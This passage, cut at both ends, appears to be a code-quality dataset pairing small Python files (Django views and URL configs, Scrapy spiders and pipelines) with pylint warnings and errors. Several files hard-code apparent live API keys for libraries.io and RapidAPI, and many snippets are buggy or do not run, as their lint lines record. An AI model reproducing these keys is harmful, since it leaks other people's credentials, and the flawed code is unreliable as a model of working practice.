29               new_words = anylyzed_words - used_words
30           else:
31               new_words = set()
32   
33           if new_words:
34               suggests.append({""input"": list(new_words), ""weight"": weight})
35   
36       return suggests
37   
38   
39   class PmArticlesItem(scrapy.Item):
40       # define the fields for your item here like:
41       title = scrapy.Field()
42       create_date = scrapy.Field()
43       url = scrapy.Field()
44       content = scrapy.Field()
45       view = scrapy.Field()
46       tag = scrapy.Field()
47       url_id = scrapy.Field()
48   
49       def save_to_es(self):
50           article = ArticleType()
51           article.title = self['title']
52           article.create_date = self[""create_date""]
53           article.content = self[""content""]
54           article.url = self[""url""]
55           article.view = self[""view""]
56           article.tag = self[""tag""]
57           article.meta.id = self[""url_id""]
58   
59           article.suggest = gen_suggests(ArticleType._doc_type.index, ((article.title, 10), (article.tag, 7)))
60   
61           article.save()
62   
63           redis_cli.incr(""pm_count"")  # redis存储爬虫数量
64   
65           return
66   
","15 - warning: protected-access
28 - refactor: consider-using-set-comprehension
59 - warning: protected-access
49 - refactor: useless-return
39 - refactor: too-few-public-methods
10 - warning: unused-import
11 - warning: unused-import
"
"1   from django.urls import path
2   from . import views
3   from django.conf.urls import include, url
4   from django.views import generic
5   from material.frontend import urls as frontend_urls
6   
7   urlpatterns = [
8       path('', views.home, name='home'),
9       path('$/', generic.RedirectView.as_view(url='/workflow/', permanent=False)),
10       path('/', include(frontend_urls)),
11   ]
12       
13       
14   # Viewflow PRO Feature Set
15   
16   #     Celery integration
17   #     django-guardian integration
18   #     Flow graph visualization
19   #     Flow BPMN export
20   #     Material Frontend
21   
22   #     Process dashboard view
23   #     Flow migration support
24   #     Subprocess support
25   #     REST API support
26   
","2 - error: no-name-in-module
3 - warning: unused-import
"
"1   from django.shortcuts import render
2   from .forms import  SearchForm
3   import requests
4   def base(request):
5       # import requests
6   
7       # # url = ""https://gplaystore.p.rapidapi.com/newFreeApps""
8       # url=""https://libraries.io/api/""
9       # querystring = {""platforms"":""NPM/base62""}
10   
11       # headers = {'x-rapidapi-key': ""?api_key=306cf1684a42e4be5ec0a1c60362c2ef'"" }
12   
13       # response = requests.request(""GET"", url, headers=headers, params=querystring)
14   
15       # print(response.text)
16   
17      return render(request, 'base.html'
18       )
19   
20   def home(request):
21    
22   
23   
24   #  Platforms=(' https://libraries.io/api/platforms?api_key=306cf1684a42e4be5ec0a1c60362c2ef')
25   #  Project=('https://libraries.io/api/NPM/base62?api_key=306cf1684a42e4be5ec0a1c60362c2ef')
26   
27       # url=requests()
28       # url='https://libraries.io/api/:platform/:name/dependent_repositories?api_key=306cf1684a42e4be5ec0a1c60362c2ef'
29       # url=requests.get('https://libraries.io/api/github/librariesio/repositories?api_key=306cf1684a42e4be5ec0a1c60362c2ef')
30       url=requests.get('https://libraries.io/api/platforms?api_key=306cf1684a42e4be5ec0a1c60362c2ef')
31       
32       form=url.json()
33       return render(request, 'index.html',{
34           'form':form
35       }
36       )
37   
38   
39   def Search(request):
40   #     form= SearchForm()
41   #     query=None
42   #     results=[]
43   
44   #     # if 'query' in requests.GET:
45   #     #   form=SearchForm(request.GET)
46   #     #   if form.is_valid():
47   #     #       query=form.cleaned_data['query']
48   #     #       results=Post.published.annotate(
49   #     #           search =SearchVector('title','body'),
50   #     #           ).filter(search=query)
51       r=requests.get('https://libraries.io/api/search?q=&api_key=306cf1684a42e4be5ec0a1c60362c2ef')   
52   
53       dr=r.json()
54       return render(request, 'Search.html',{
55           'search':dr
56       }
57       )
58   
59   
60   
61   # def  post_search(request):
62   #     form= SearchForm()
63       
64   #     payload={'key1':'search?q=','key2':['form','&api_key=306cf1684a42e4be5ec0a1c60362c2ef']}
65   
66   #     url=requests.get=('https://libraries.io/api/get',params=payload) 
67   #     # results=[]
68   #     # if 'query' in request.GET:
69   #     #     form=SearchForm(
70   #         # if form.is_valid():
71   #         #     query=form.cleaned_data['query']
72   #         #     results=Post.published.annotate(
73   #         #         search =SearchVector('title','body'),
74   #         #         ).filter(search=query)
75   #     return render(request,'search.html',{
76   #         'url':url,
77   #         # 'query':query,
78   #         # 'results':results
79   #     })            
80   
81   
","17 - warning: bad-indentation
2 - error: relative-beyond-top-level
30 - warning: missing-timeout
51 - warning: missing-timeout
2 - warning: unused-import
"
"1   from django.http.response import HttpResponse
2   from requests_oauthlib import OAuth2Session
3   
4   
5   import json
6   
7   import requests_oauthlib
8   from django.HttpResponse import request
9   import requests
10   from django.shortcuts import  redirect, session,
11   
12   #  payload={'key1':'search?q=','key2':['form','&api_key=306cf1684a42e4be5ec0a1c60362c2ef']}
13   # client_id = '&api_key=306cf1684a42e4be5ec0a1c60362c2ef'
14   client_id = ""<your client key>""
15   client_secret = ""<your client secret>""
16   authorization_base_url = 'https://github.com/login/oauth/authorize'
17   token_url = 'https://github.com/login/oauth/access_token'
18   
19   
20   
21   @app.route(""/login"")
22   def login():
23       github = OAuth2Session(client_id)
24       authorization_url, state = github.authorization_url(authorization_base_url)
25   
26       # State is used to prevent CSRF, keep this for later.
27       session['oauth_state'] = state
28       return redirect(authorization_url)
29   
30   
31   
32   @app.route(""/callback"")
33   def callback():
34       github = OAuth2Session(client_id, state=session['oauth_state'])
35       token = github.fetch_token(token_url, client_secret=client_secret,
36                                  authorization_response=request.url)
37   
38       return json(github.get('https://api.github.com/user').json())    ","10 - error: syntax-error
"
"1   #rabbitmq and mongodb settings
2   SCHEDULER = "".rabbitmq.scheduler.Scheduler""
3   SCHEDULER_PERSIST = True
4   RABBITMQ_HOST = 'ip address'
5   RABBITMQ_PORT = 5672
6   RABBITMQ_USERNAME = 'guest'
7   RABBITMQ_PASSWORD = 'guest'
8   
9   MONGODB_PUBLIC_ADDRESS = 'ip:port'  # This will be shown on the web interface, but won't be used for connecting to DB
10   MONGODB_URI = 'ip:port'  # Actual uri to connect to DB
11   MONGODB_USER = ''
12   MONGODB_PASSWORD = ''
13   MONGODB_SHARDED = False
14   MONGODB_BUFFER_DATA = 100
15   
16   LINK_GENERATOR = 'http://192.168.0.209:6800'  # Set your link generator worker address here
17   SCRAPERS = ['http://192.168.0.210:6800',
18               'http://192.168.0.211:6800', 'http://192.168.0.212:6800']  # Set your scraper worker addresses here
19   
20   LINUX_USER_CREATION_ENABLED = False  # Set this to True if you want a linux user account created during registration
","Clean Code: No Issues Detected
"
"1   from django.urls import path
2   from . import views
3   
4   
5   
6   urlpatterns = [
7       path('', views.api, name='api'),
8       path('t/', views.simple_upload, name='test'),
9   
10       ]
","2 - error: no-name-in-module
"
"1   # -*- coding: utf-8 -*-
2   
3   try:
4       import pika
5   except ImportError:
6       raise ImportError(""Please install pika before running scrapy-rabbitmq."")
7   
8   
9   RABBITMQ_CONNECTION_TYPE = 'blocking'
10   RABBITMQ_CONNECTION_PARAMETERS = {'host': 'localhost'}
11   
12   
13   def from_settings(settings, spider_name):
14   
15       connection_type = settings.get('RABBITMQ_CONNECTION_TYPE',
16                                      RABBITMQ_CONNECTION_TYPE)
17       queue_name = ""%s:requests"" % spider_name
18       connection_host = settings.get('RABBITMQ_HOST')
19       connection_port = settings.get('RABBITMQ_PORT')
20       connection_username = settings.get('RABBITMQ_USERNAME')
21       connection_pass = settings.get('RABBITMQ_PASSWORD')
22   
23       connection_attempts = 5
24       retry_delay = 3
25   
26       credentials = pika.PlainCredentials(connection_username, connection_pass)
27   
28       connection = {
29           'blocking': pika.BlockingConnection,
30           'libev': pika.LibevConnection,
31           'select': pika.SelectConnection,
32           'tornado': pika.TornadoConnection,
33           'twisted': pika.TwistedConnection
34       }[connection_type](pika.ConnectionParameters(host=connection_host,
35                          port=connection_port, virtual_host='/',
36                          credentials=credentials,
37                          connection_attempts=connection_attempts,
38                          retry_delay=retry_delay))
39   
40       channel = connection.channel()
41       channel.queue_declare(queue=queue_name, durable=True)
42   
43       return channel
44   
45   
46   def close(channel):
47       channel.close()
","6 - warning: raise-missing-from
"
"1   # -*- coding: utf-8 -*-
2   
3   #如果没有下一页的地址则返回none
4   list_first_item = lambda x:x[0] if x else None
","Clean Code: No Issues Detected
"
"1   from django.conf.urls import url, include
2   import oauth2_provider.views as oauth2_views
3   from django.conf import settings
4   from .views import ApiEndpoint
5   from django.urls import include, path
6   
7   # OAuth2 provider endpoints
8   oauth2_endpoint_views = [
9       path('authorize/', oauth2_views.AuthorizationView.as_view(), name=""authorize""),
10       path('token/', oauth2_views.TokenView.as_view(), name=""token""),
11       path('revoke-token/', oauth2_views.RevokeTokenView.as_view(), name=""revoke-token""),
12   ]
13   
14   if settings.DEBUG:
15       # OAuth2 Application Management endpoints
16       oauth2_endpoint_views += [
17           path('applications/', oauth2_views.ApplicationList.as_view(), name=""list""),
18           path('applications/register/', oauth2_views.ApplicationRegistration.as_view(), name=""register""),
19           path('applications/<pk>/', oauth2_views.ApplicationDetail.as_view(), name=""detail""),
20           path('applications/<pk>/delete/', oauth2_views.ApplicationDelete.as_view(), name=""delete""),
21           path('applications/<pk>/update/', oauth2_views.ApplicationUpdate.as_view(), name=""update""),
22       ]
23   
24       # OAuth2 Token Management endpoints
25       oauth2_endpoint_views += [
26           path('authorized-tokens/', oauth2_views.AuthorizedTokensListView.as_view(), name=""authorized-token-list""),
27           path('authorized-tokens/<pk>/delete/', oauth2_views.AuthorizedTokenDeleteView.as_view(),
28               name=""authorized-token-delete""),
29       ]
30   
31   urlpatterns = [
32       # OAuth 2 endpoints:
33       path('o/', include(oauth2_endpoint_views, namespace=""oauth2_provider"")),
34       path('api/hello', ApiEndpoint.as_view()),  # an example resource endpoint
35   ]
","4 - error: relative-beyond-top-level
5 - warning: reimported
1 - warning: unused-import
"
"1   # Generated by Django 3.1.3 on 2020-11-13 06:33
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('core', '0003_auto_20201113_0620'),
10       ]
11   
12       operations = [
13           migrations.AddField(
14               model_name='feeds',
15               name='description',
16               field=models.TextField(blank=True),
17           ),
18           migrations.AlterField(
19               model_name='feeds',
20               name='overview',
21               field=models.TextField(max_length=20),
22           ),
23       ]
","6 - refactor: too-few-public-methods
"
"1   from django import forms
2   
3   from .models import  Products
4   
5   
6   
7   
8   
9   
10   class productForm(forms.ModelForm):
11   	class Meta:
12   		model=Products
13   		fields=['title','description','price']","11 - warning: bad-indentation
12 - warning: bad-indentation
13 - warning: bad-indentation
3 - error: relative-beyond-top-level
11 - refactor: too-few-public-methods
10 - refactor: too-few-public-methods
"
"1   import http.client
2   
3   conn = http.client.HTTPSConnection(""bloomberg-market-and-financial-news.p.rapidapi.com"")
4   
5   headers = {
6       'x-rapidapi-key': ""bd689f15b2msh55122d4390ca494p17cddcjsn225c43ecc6d4"",
7       'x-rapidapi-host': ""bloomberg-market-and-financial-news.p.rapidapi.com""
8       }
9   
10   conn.request(""GET"", ""/market/get-cross-currencies?id=aed%2Caud%2Cbrl%2Ccad%2Cchf%2Ccnh%2Ccny%2Ccop%2Cczk%2Cdkk%2Ceur%2Cgbp%2Chkd%2Chuf%2Cidr%2Cils%2Cinr%2Cjpy%2Ckrw%2Cmxn%2Cmyr%2Cnok%2Cnzd%2Cphp%2Cpln%2Crub%2Csek%2Csgd%2Cthb%2Ctry%2Ctwd%2Cusd%2Czar"", headers=headers)
11   
12   res = conn.getresponse()
13   data = res.read()
14   
15   
16       # print(data.decode(""utf-8""))
17   print(data.json())","Clean Code: No Issues Detected
"
"1   from django import forms
2   
3   
4   #Building a search view
5   
6   
7   
8   class  SearchForm(forms.Form):
9       query =forms.CharField()
10   
11   
12   class uploadForm(forms.ModelForm):
13       images=forms.ImageField()
14   
15   
16   
17   # # from .forms import EmailPostForm, CommentForm , SearchForm
18   # User Repositories='https://libraries.io/api/github/:login/repositories?api_key=306cf1684a42e4be5ec0a1c60362c2ef'
19   # user='             https://libraries.io/api/github/andrew?api_key=306cf1684a42e4be5ec0a1c60362c2ef'
20   # Repository='       https://libraries.io/api/github/:owner/:name?api_key=306cf1684a42e4be5ec0a1c60362c2ef'
21   #            ='      https://libraries.io/api/github/gruntjs/grunt/projects?api_key=306cf1684a42e4be5ec0a1c60362c2ef '
22   # ProjectSearch='    https://libraries.io/api/search?q=grunt&api_key=306cf1684a42e4be5ec0a1c60362c2ef'
23   # Platforms= ' GET   https://libraries.io/api/platforms?api_key=306cf1684a42e4be5ec0a1c60362c2ef '
24   #                    https://libraries.io/api/NPM/base62?api_key=306cf1684a42e4be5ec0a1c60362c2ef '
25   
26   # ProjectDependen    https://libraries.io/api/:platform/:name/:version/dependencies?api_key=306cf1684a42e4be5ec0a1c60362c2ef'
27   #                  ' https://libraries.io/api/NPM/base62/2.0.1/dependencies?api_key=306cf1684a42e4be5ec0a1c60362c2ef '
28   # DependentReposito= https://libraries.io/api/NPM/base62/dependent_repositories?api_key=306cf1684a42e4be5ec0a1c60362c2ef '
29   # ProjectContributo= https://libraries.io/api/NPM/base62/contributors?api_key=306cf1684a42e4be5ec0a1c60362c2ef '
30   # ProjectSourceRank='https://libraries.io/api/NPM/base62/sourcerank?api_key=306cf1684a42e4be5ec0a1c60362c2ef'","8 - refactor: too-few-public-methods
12 - refactor: too-few-public-methods
"
"1   from django.conf.urls import url
2   from . import views
3   
4   urlpatterns = [
5       url('api/', views.apiurl, name='index'),
6   
7   ]","2 - error: no-name-in-module
"
"1   """"""mysite URL Configuration
2   
3   The `urlpatterns` list routes URLs to views. For more information please see:
4       https://docs.djangoproject.com/en/1.8/topics/http/urls/
5   Examples:
6   Function views
7       1. Add an import:  from my_app import views
8       2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
9   Class-based views
10       1. Add an import:  from other_app.views import Home
11       2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
12   Including another URLconf
13       1. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
14   """"""
15   from django.conf.urls import include, url
16   from django.contrib import admin
17   from mysite.views import custom_login, custom_register
18   from django.contrib.auth.views import logout
19   import scrapyproject.urls as projecturls
20   
21   urlpatterns = [
22       url(r'^admin/', include(admin.site.urls)),
23       url(r'^accounts/login/$', custom_login, name='login'),
24       url(r'^accounts/register/$', custom_register, name='registration_register'),
25       url(r'^accounts/logout/$', logout, {'next_page': '/project'}, name='logout'),
26       url(r'^project/', include(projecturls)),
27   ]
","Clean Code: No Issues Detected
"
"1   import collections
2   from scrapy.exceptions import DropItem
3   from scrapy.exceptions import DropItem
4   
5   import pymongo
6   
7   class TutoPipeline(object):
8       vat=2.55
9   
10       def process_item(self, item, spider):
11           if item[""price""]:
12               if item['exclues_vat']:
13                   item['price']= item['price']*self.vat
14                   return item
15   
16               else:
17                   raise DropItem(""missing price in %s""% item)
18           
19           return item
20   
21   
22   
23   class MongoPipline(object):
24       collections_name='scrapy_list'
25   
26       def __init__(self,mongo_uri,mongo_db):
27           self.mongo_uri= mongo_uri
28           self.mongo_db=mongo_db
29   
30       @classmethod
31       def from_crewler(cls,crawler):
32           return cls(
33               mongo_uri=crawler.settings.get('MONGO_URI'),
34   
35               mongo_db=crawler.settings.get('MONGO_DB','Lists')
36           )    
37   
38       def open_spider(self,spider):
39           self.client=pymongo.MongoClient(self.mongo_uri)
40           self.db=self.client[self.mongo_db]
41   
42   
43       def close_spider(self,spider):
44           self.client.close()
45   
46   
47       def process_item(self,item,spider):
48           self.db[self.collection_name].insert(dict(item))
49           return item
50   
51           # You can specify the MongoDB address and
52           #  database name in Scrapy settings and MongoDB
53           #  collection can be named after the item class.
54           #  The following code describes 
55           # how to use from_crawler() method to collect the resources properly −
56   
57   
58   
59   class DuplicatePiline(object):
60       def __init__(self):
61           self.ids_seen=set()
62   
63   
64       def process_item(self,item,spider):
65           if item['id' ] in  self.ids_seen:
66               raise DropItem(""Repacted Item Found:%s""%item)
67   
68           else:
69               self.ids_seen.add(item['id'])
70   
71               return item    
72   
","3 - warning: reimported
7 - refactor: useless-object-inheritance
12 - refactor: no-else-return
10 - warning: unused-argument
7 - refactor: too-few-public-methods
23 - refactor: useless-object-inheritance
38 - warning: unused-argument
43 - warning: unused-argument
48 - error: no-member
47 - warning: unused-argument
39 - warning: attribute-defined-outside-init
40 - warning: attribute-defined-outside-init
59 - refactor: useless-object-inheritance
65 - refactor: no-else-raise
64 - warning: unused-argument
59 - refactor: too-few-public-methods
1 - warning: unused-import
"
"1   import logging
2   import scrapy
3   
4   logger = logging.getLogger('mycustomlogger')
5   
6   class MySpider(scrapy.Spider):
7   
8       name = 'myspider1'
9       start_urls = ['https://scrapinghub.com']
10   
11       def parse(self, response):
12           logger.info('Parse function called on %s', response.url)","6 - refactor: too-few-public-methods
"
"1   import scrapy
2   
3   
4   class PySpider(scrapy.Spider):
5       name = 'quots'
6       # start_urls = [
7       def start_requests(self):
8           urls=['https://pypi.org/']
9   
10   
11           for url in urls:
12               yield scrapy.Request(url=url, callback=self.parse)
13   
14   
15           # return super().start_requests()()
16   
17       def parse(self, response):
18           page=response.url.split(""/"")[-0]
19           response.xpath('/html/body/main/div[4]/div/text()').get()
20   
21   
22           filename=f'pyp-{page}.html'
23   
24   
25           with open (filename,'wb')as f:
26               f.write(response.body)
27           self.log(f'saved file{filename}')    
28   
29   
30           # return super().parse(response)    ","Clean Code: No Issues Detected
"
"1   from django import forms
2   
3   from core.models import Comment
4   
5   #Building a search view
6   class  SearchForm(forms.Form):
7       query =forms.CharField()
8   
9   
10   
11   class EmailPostForm(forms.Form):
12       name = forms.CharField(max_length=25)
13       email = forms.EmailField()
14       to = forms.EmailField()
15       comments = forms.CharField(required=False,
16                                  widget=forms.Textarea)
17   
18   
19   class CommentForm(forms.ModelForm):
20       url = forms.URLField(label='网址', required=False)
21       email = forms.EmailField(label='电子邮箱', required=True)
22       name = forms.CharField(
23           label='姓名',
24           widget=forms.TextInput(
25               attrs={
26                   'value': """",
27                   'size': ""30"",
28                   'maxlength': ""245"",
29                   'aria-required': 'true'}))
30       parent_comment_id = forms.IntegerField(
31           widget=forms.HiddenInput, required=False)
32   
33       class Meta:
34           model = Comment
35           fields = ['body']","6 - refactor: too-few-public-methods
11 - refactor: too-few-public-methods
33 - refactor: too-few-public-methods
19 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   from __future__ import unicode_literals
3   from mongoengine import *
4   from django.db import models
5   
6   # Create your models here.
7   class ItemInfo(Document):
8       # 帖子名称
9       title = StringField()
10       # 租金
11       money = StringField()
12       # 租赁方式
13       method = StringField()
14       # 所在区域
15       area = StringField()
16       # 所在小区
17       community = StringField()
18       # 帖子详情url
19       targeturl = StringField()
20       # 帖子发布时间
21       pub_time = StringField()
22       # 所在城市
23       city = StringField()
24       phone = StringField()
25       img1= StringField()
26       img2 = StringField()
27       #指定是数据表格
28       meta={'collection':'zufang_detail'}
","3 - warning: wildcard-import
7 - error: undefined-variable
9 - error: undefined-variable
11 - error: undefined-variable
13 - error: undefined-variable
15 - error: undefined-variable
17 - error: undefined-variable
19 - error: undefined-variable
21 - error: undefined-variable
23 - error: undefined-variable
24 - error: undefined-variable
25 - error: undefined-variable
26 - error: undefined-variable
7 - refactor: too-few-public-methods
4 - warning: unused-import
"
"1   from django.shortcuts import render
2   from urllib.request import urlopen
3   from django.shortcuts import render
4   from django.views import View
5   import requests
6   
7   # class apiurl(View):
8   
9   def apiurl(request):
10       url =requests('https://api.github.com/')
11       
12       data=url.requests.json()
13       context ={
14           'data':data
15       }
16       
17       return render(request,'index.html', context)
18   
19   
","3 - warning: reimported
10 - error: not-callable
2 - warning: unused-import
4 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   -------------------------------------------------
4      File Name：     urls.py  
5      Description :  
6      Author :       JHao
7      date：          2017/4/13
8   -------------------------------------------------
9      Change Activity:
10                      2017/4/13: 
11   -------------------------------------------------
12   """"""
13   __author__ = 'JHao'
14   
15   from blog import views
16   from django.urls import path
17   
18   urlpatterns = [
19       path('', views.index, name='index'),
20       path('list/', views.blog_list, name='list'),
21       path('tag/<str:name>/', views.tag, name='tag'),
22       path('category/<str:name>/', views.category, name='category'),
23       path('detail/<int:pk>/', views.detail, name='detail'),
24       path('archive/', views.archive, name='archive'),
25       path('search/', views.search, name='search'),
26       path('message/', views.message, name='message'),
27       path('getComment/', views.get_comment, name='get_comment'),
28   
29   ]
30   
","Clean Code: No Issues Detected
"
"1   from  fpdf  import  FPDF 
2   from  PIL  import  Image 
3   import  you 
4   import os
5   pdf  =  FPDF () 
6   imagelist  =  []                                                  # Contains the list of all images to be converted to PDF. 
7   
8   
9   # --------------- USER INPUT -------------------- # 
10   
11   folder  =  ""/home/rudi/Documents/Pictures/1.png""                                                     # Folder containing all the images. 
12   name  =  ""pdf""                                                       # Name of the output PDF file. 
13   
14   
15   # ------------- ADD ALL THE IMAGES IN A LIST ------------- # 
16   
17   for  dirpath ,  dirnames ,  filenames  in  os . walk ( folder ): 
18       for  filename  in [ f  for  f  in  filenames  if  f . endswith ( "".jpg"" )]: 
19           full_path  =  os . path . join ( dirpath ,  filename ) 
20           imagelist . append ( full_path ) 
21   
22   imagelist . sort ()                                                # Sort the images by name. 
23   for  i  in  range ( 0 , len ( imagelist )): 
24       print ( imagelist [ i ]) 
25   
26   # --------------- ROTATE ANY LANDSCAPE MODE IMAGE IF PRESENT ----------------- # 
27   
28   for  i  in  range ( 0 , len ( imagelist )): 
29       im1  =  Image . open ( imagelist [ i ])                              # Open the image. 
30       width ,  height  =  im1 . size                                    # Get the width and height of that image. 
31       if  width  >  height : 
32           im2  =  im1 . transpose ( Image . ROTATE_270 )                   # If width > height, rotate the image. 
33           os . remove ( imagelist [ i ])                                 # Delete the previous image. 
34           im2 . save ( imagelist [ i ])                                  # Save the rotated image. 
35           # im.save 
36   
37   print ( "" \n Found ""  +  str ( len ( imagelist ))  +  "" image files. Converting to PDF.... \n "" ) 
38   
39   
40   # -------------- CONVERT TO PDF ------------ # 
41   
42   for  image  in  imagelist : 
43       pdf . add_page () 
44       pdf . image ( image ,  0 ,  0 ,  210 ,  297 )                            # 210 and 297 are the dimensions of an A4 size sheet. 
45   
46   pdf . output ( folder  +  name ,  ""F"" )                                  # Save the PDF. 
47   
48   print ( ""PDF generated successfully!"" ) ","32 - error: no-member
3 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   # Create your views here.
3   
4   import json
5   from django.http import JsonResponse
6   from django_blog.util import PageInfo
7   from blog.models import Article, Comment
8   from django.views.decorators.csrf import csrf_exempt
9   from django.shortcuts import render, get_object_or_404
10   
11   
12   def get_page(request):
13       page_number = request.GET.get(""page"")
14       return 1 if not page_number or not page_number.isdigit() else int(page_number)
15   
16   
17   def index(request):
18       _blog_list = Article.objects.all().order_by('-date_time')[0:5]
19       _blog_hot = Article.objects.all().order_by('-view')[0:6]
20       return render(request, 'blog/index.html', {""blog_list"": _blog_list, ""blog_hot"": _blog_hot})
21   
22   
23   def blog_list(request):
24       """"""
25       列表
26       :param request:
27       :return:
28       """"""
29       page_number = get_page(request)
30       blog_count = Article.objects.count()
31       page_info = PageInfo(page_number, blog_count)
32       _blog_list = Article.objects.all()[page_info.index_start: page_info.index_end]
33       return render(request, 'blog/list.html', {""blog_list"": _blog_list, ""page_info"": page_info})
34   
35   
36   def category(request, name):
37       """"""
38       分类
39       :param request:
40       :param name:
41       :return:
42       """"""
43       page_number = get_page(request)
44       blog_count = Article.objects.filter(category__name=name).count()
45       page_info = PageInfo(page_number, blog_count)
46       _blog_list = Article.objects.filter(category__name=name)[page_info.index_start: page_info.index_end]
47       return render(request, 'blog/category.html', {""blog_list"": _blog_list, ""page_info"": page_info,
48                                                     ""category"": name})
49   
50   
51   def tag(request, name):
52       """"""
53       标签
54       :param request:
55       :param name
56       :return:
57       """"""
58       page_number = get_page(request)
59       blog_count = Article.objects.filter(tag__tag_name=name).count()
60       page_info = PageInfo(page_number, blog_count)
61       _blog_list = Article.objects.filter(tag__tag_name=name)[page_info.index_start: page_info.index_end]
62       return render(request, 'blog/tag.html', {""blog_list"": _blog_list,
63                                                ""tag"": name,
64                                                ""page_info"": page_info})
65   
66   
67   def archive(request):
68       """"""
69       文章归档
70       :param request:
71       :return:
72       """"""
73       _blog_list = Article.objects.values(""id"", ""title"", ""date_time"").order_by('-date_time')
74       archive_dict = {}
75       for blog in _blog_list:
76           pub_month = blog.get(""date_time"").strftime(""%Y年%m月"")
77           if pub_month in archive_dict:
78               archive_dict[pub_month].append(blog)
79           else:
80               archive_dict[pub_month] = [blog]
81       data = sorted([{""date"": _[0], ""blogs"": _[1]} for _ in archive_dict.items()], key=lambda item: item[""date""],
82                     reverse=True)
83       return render(request, 'blog/archive.html', {""data"": data})
84   
85   
86   def message(request):
87       return render(request, 'blog/message_board.html', {""source_id"": ""message""})
88   
89   
90   @csrf_exempt
91   def get_comment(request):
92       """"""
93       接收畅言的评论回推， post方式回推
94       :param request:
95       :return:
96       """"""
97       arg = request.POST
98       data = arg.get('data')
99       data = json.loads(data)
100       title = data.get('title')
101       url = data.get('url')
102       source_id = data.get('sourceid')
103       if source_id not in ['message']:
104           article = Article.objects.get(pk=source_id)
105           article.commenced()
106       comments = data.get('comments')[0]
107       content = comments.get('content')
108       user = comments.get('user').get('nickname')
109       Comment(title=title, source_id=source_id, user_name=user, url=url, comment=content).save()
110       return JsonResponse({""status"": ""ok""})
111   
112   
113   def detail(request, pk):
114       """"""
115       博文详情
116       :param request:
117       :param pk:
118       :return:
119       """"""
120       blog = get_object_or_404(Article, pk=pk)
121       blog.viewed()
122       return render(request, 'blog/detail.html', {""blog"": blog})
123   
124   
125   def search(request):
126       """"""
127       搜索
128       :param request:
129       :return:
130       """"""
131       key = request.GET['key']
132       page_number = get_page(request)
133       blog_count = Article.objects.filter(title__icontains=key).count()
134       page_info = PageInfo(page_number, blog_count)
135       _blog_list = Article.objects.filter(title__icontains=key)[page_info.index_start: page_info.index_end]
136       return render(request, 'blog/search.html', {""blog_list"": _blog_list, ""pages"": page_info, ""key"": key})
137   
138   
139   def page_not_found_error(request, exception):
140       return render(request, ""404.html"", status=404)
141   
142   
143   def page_error(request):
144       return render(request, ""404.html"", status=500)
","139 - warning: unused-argument
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   -------------------------------------------------
4      File Name：     blogroll
5      Description :
6      Author :        JHao
7      date：          2020/10/9
8   -------------------------------------------------
9      Change Activity:
10                      2020/10/9:
11   -------------------------------------------------
12   """"""
13   __author__ = 'JHao'
14   
15   sites = [
16       {""url"": ""https://www.zaoshu.io/"", ""name"": ""造数"", ""desc"": ""智能云爬虫""},
17       {""url"": ""http://brucedone.com/"", ""name"": ""大鱼的鱼塘"", ""desc"": ""大鱼的鱼塘 - 一个总会有收获的地方""},
18       {""url"": ""http://www.songluyi.com/"", ""name"": ""灯塔水母"", ""desc"": ""灯塔水母""},
19       {""url"": ""http://blog.topspeedsnail.com/"", ""name"": ""斗大的熊猫"", ""desc"": ""本博客专注于技术，Linux，编程，Python，C，Ubuntu、开源软件、Github等""},
20       {""url"": ""https://www.urlteam.org/"", ""name"": ""URL-team"", ""desc"": ""URL-team""},
21   ]","Clean Code: No Issues Detected
"
"1   from django.contrib import admin
2   from .models import Project, Item, Field, Pipeline
3   
4   # Register your models here.
5   admin.site.register(Project)
6   admin.site.register(Item)
7   admin.site.register(Field)
8   admin.site.register(Pipeline)","2 - error: relative-beyond-top-level
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   -------------------------------------------------
4      File Name：     context_processors.py  
5      Description :  
6      Author :       JHao
7      date：          2017/4/14
8   -------------------------------------------------
9      Change Activity:
10                      2017/4/14: 
11   -------------------------------------------------
12   """"""
13   __author__ = 'JHao'
14   
15   import importlib
16   from django_blog import blogroll
17   from blog.models import Category, Article, Tag, Comment
18   
19   
20   def sidebar(request):
21       category_list = Category.objects.all()
22       # 所有类型
23   
24       blog_top = Article.objects.all().values(""id"", ""title"", ""view"").order_by('-view')[0:6]
25       # 文章排行
26   
27       tag_list = Tag.objects.all()
28       # 标签
29   
30       comment = Comment.objects.all().order_by('-create_time')[0:6]
31       # 评论
32   
33       importlib.reload(blogroll)
34       # 友链
35   
36       return {
37           'category_list': category_list,
38           'blog_top': blog_top,
39           'tag_list': tag_list,
40           'comment_list': comment,
41           'blogroll': blogroll.sites
42   
43       }
44   
45   
46   if __name__ == '__main__':
47       pass
","20 - warning: unused-argument
"
"1   # -*- coding: utf-8 -*-
2   
3   # Define your item pipelines here
4   #
5   # Don't forget to add your pipeline to the ITEM_PIPELINES setting
6   # See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html
7   
8   import logging
9   # import MySQLdb
10   # import MySQLdb.cursors
11   import copy
12   import pymysql
13   from twisted.enterprise import adbapi
14   
15   
16   # class ArticlesPipeline(object):
17   #     def process_item(self, item, spider):
18   #         return item
19   
20   
21   class MysqlTwistedPipeline(object):
22       def __init__(self, dbpool):
23           self.dbpool = dbpool
24   
25       @classmethod
26       def from_settings(cls, settings):  # 函数名固定，会被scrapy调用，直接可用settings的值
27           """"""
28           数据库建立连接
29           :param settings: 配置参数
30           :return: 实例化参数
31           """"""
32           adbparams = dict(
33               host=settings['MYSQL_HOST'],
34               db=settings['MYSQL_DBNAME'],
35               user=settings['MYSQL_USER'],
36               password=settings['MYSQL_PASSWORD'],
37               cursorclass=pymysql.cursors.DictCursor  # 指定cursor类型
38           )
39   
40           # 连接数据池ConnectionPool，使用pymysql或者Mysqldb连接
41           dbpool = adbapi.ConnectionPool('pymysql', **adbparams)
42           # 返回实例化参数
43           return cls(dbpool)
44   
45       def process_item(self, item, spider):
46           """"""
47           使用twisted将MySQL插入变成异步执行。通过连接池执行具体的sql操作，返回一个对象
48           """"""
49           # 防止入库速度过慢导致数据重复
50           item = copy.deepcopy(item)
51           query = self.dbpool.runInteraction(self.do_insert, item)  # 指定操作方法和操作数据
